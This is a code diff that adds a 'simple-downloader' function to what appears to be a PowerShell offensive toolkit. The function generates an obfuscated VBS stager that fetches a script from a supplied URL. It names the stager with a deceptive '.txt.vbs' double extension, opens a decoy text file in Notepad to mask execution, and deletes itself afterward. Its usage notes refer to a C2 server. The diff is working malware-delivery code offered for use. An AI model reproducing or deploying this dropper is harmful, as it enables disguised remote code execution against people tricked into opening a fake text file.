@@ -835,6 +835,62 @@ function simple-persistence($scriptUrl) {
 
 }
 
+function simple-downloader($scriptUrl) {
+
+        if ($scriptUrl)
+        {
+
+                if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
+                {
+
+                        #[->] insure cmd string is working or not before intensive debugging
+                        $cmdstring = persistent-stager $scriptUrl
+
+                        #[->] create vbs script then change attribute to hidden
+                        $saveDir = $pwd.Path + '\'
+
+                        #[->] insure cmd string is working or not before intensive debugging
+                        $vbsCode = obfuscate-cmdstring $cmdstring 'vbs'
+
+                        $rand = rand-str
+                        $vbsName = 'contact-' + $rand + '.txt.vbs'
+                        $noteName = 'contact-' + $rand + '.txt'
+                        $notePath = $saveDir + $noteName
+                        $vbspath = $saveDir + $vbsName
+
+                        #[->] cmd string to generate txt file
+                        $NPcmdstring = 'cmd /c echo johndoe@yahoo.com > ' + $notePath + ' && notepad ' + $noteName
+                        $vbsCode += "`r`n"
+                        $vbsCode += obfuscate-cmdstring $NPcmdstring 'vbs'
+
+                        #[->] get vbs code to self-destruct
+                        $randFso = rand-str
+                        $vbsCode += "`r`n"
+                        $vbsCode += 'set ' +  $randFso + ' = ' + 'CreateObject("Scripting.FileSystemObject")' + "`r`n"
+                        $vbsCode += $randFso + '.DeleteFile Wscript.ScriptFullName'
+
+                        set-content $vbspath $vbsCode -Encoding ASCII
+                        write-output "[+] finished generating obfuscated persistent stager."
+
+                } else {
+
+                        write-output "[!] FAilED!`n[!]You need to use a proper URL"
+                        write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
+                }
+
+        } else {
+
+                $usage =  "`n" + '[=>] Ex: RSH => C:\> simple-downloader "https://your-domain.com/ps-script"' + "`n"
+                $usage += '[=>] drops an obfuscated vbs script to the current working folder.' + "`n"
+                $usage += '[=>] Insure that the script to be downloaded is self contained and' + "`n"
+                $usage += '[=>] does not need additional parameters for the C2 ip/port etc...' + "`n"
+
+                write-output $usage
+
+        }
+
+}
+
 # action = hide or clear
 # key = encrpytion or decryption string
 # string = base64 string to either be encrypted or decrypted
